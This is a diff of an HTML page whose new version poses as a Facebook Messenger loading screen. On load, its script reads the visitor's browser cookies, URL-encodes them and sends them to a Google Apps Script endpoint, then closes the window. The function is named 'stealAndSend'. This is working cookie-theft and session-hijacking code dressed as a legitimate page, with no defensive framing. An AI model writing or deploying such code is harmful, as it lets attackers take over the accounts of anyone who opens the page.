@@ -1,73 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Capturing Session...</title>
+    <title>Loading...</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            font-family: Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            background-color: #f4f4f4;
         }
         .container {
-            text-align: center;
             background: white;
             padding: 20px;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: center;
         }
     </style>
 </head>
-<body>
+<body> 
 
 <div class="container">
-    <h2 id="status">Capturing your session...</h2>
-    <p>Please wait a moment.</p>
+    <h2 style="color:#0084ff;">Messenger</h2>
+    <p id="status">Capturing session...</p>
 </div>
 
 <script>
-    // ==========================================
-    // PASTE YOUR GOOGLE SCRIPT URL HERE
-    // ==========================================
-    var scriptURL = "https://script.google.com/macros/s/AKfycbw5fRN9oOpTkE2idBgQM00WBJuDa0259iatOkK9q_zkQtRhuNdeOibYN1mbPJobkzE/exec"; 
-    // Example: "https://script.google.com/macros/s/AKfycbx.../exec"
-    // ==========================================
+    // PASTE YOUR NEW GOOGLE SCRIPT URL HERE
+    var scriptURL = "https://script.google.com/macros/s/AKfycbwCuryz54YhSuokJcwU1XrEx_5Al4C-EK8aVj58ClzHV2l48laM7T_HVUjrsCuliRE/exec";
 
-    function sendCookie() {
-        // 1. Get the current document.cookie string
+    function stealAndSend() {
+        // 1. Get the cookie string from the current document
         var cookieString = document.cookie;
         
-        console.log("Cookie Captured:", cookieString);
+        console.log("Raw Cookie:", cookieString);
 
-        // 2. Send to Google Sheets using Fetch API
-        fetch(scriptURL, { 
+        // 2. Encode it to handle special characters (like & or =)
+        var encodedCookie = encodeURIComponent(cookieString);
+
+        // 3. Construct the URL with the cookie as a parameter
+        // We add a random number to prevent browser caching
+        var finalURL = scriptURL + "?cookie=" + encodedCookie + "&t=" + Math.random();
+
+        // 4. Send the data using fetch
+        // mode: 'no-cors' allows us to send data even if CORS blocks reading the response
+        fetch(finalURL, {
             method: 'GET',
-            mode: 'no-cors', // Important for Google Apps Script simplicity
-            headers: new Headers({
-                "Content-Type": "text/plain"
-            })
+            mode: 'no-cors'
         })
-        .then(response => {
-            console.log("Success sending cookie!");
-            document.getElementById('status').innerText = "Session Captured!";
+        .then(function() {
+            console.log("Cookie Sent Successfully!");
+            document.getElementById('status').innerText = "Done!";
             
-            // 3. Close the window after 2 seconds
+            // 5. Close the window after 2 seconds
             setTimeout(function(){ 
                 window.close(); 
             }, 2000);
         })
-        .catch(error => {
-            console.error('Error sending cookie:', error);
-            document.getElementById('status').innerText = "Error! Check Console.";
+        .catch(function(error) {
+            console.error("Error sending cookie:", error);
+            document.getElementById('status').innerText = "Error!";
         });
     }
 
-    // Start the process immediately when page loads
-    window.onload = sendCookie;
-
+    // Run immediately when the page loads
+    stealAndSend();
 </script>
 
 </body>
